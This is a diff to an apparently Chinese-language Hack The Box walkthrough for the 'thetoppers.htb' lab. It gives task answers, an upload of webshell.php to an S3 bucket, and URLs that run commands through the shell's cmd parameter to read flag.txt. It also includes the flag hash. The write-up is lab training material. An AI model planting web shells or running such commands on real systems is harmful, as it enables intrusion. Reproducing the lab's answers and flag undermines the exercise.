@@ -142,6 +142,7 @@ answer：s3.thetoppers.htb
 Which service is running on the discovered sub-domain?
 
 子领域（s3.）的前缀是一个非常重要的线索。试着在谷歌搜索“s3 service”，了解哪家主要公司提供这项技术。提交标记时，您需要同时提供公司名称和服务名称
+
 answer：Amazon S3
 
 ## Task 6
@@ -228,6 +229,7 @@ upload: ./webshell.php to s3://thetoppers.htb/webshell.php
 ```
 
 url：`http://thetoppers.htb/webshell.php?cmd=ls ../`，发现存在flag.txt
-url：`http://thetoppers.htb/webshell.php?cmd=cat%20../flag.txt`，拿到flag
+
+url：`http://thetoppers.htb/webshell.php?cmd=cat ../flag.txt`，拿到flag
 
 answer：a980d99281a28d638ac68b9bf9453c2b
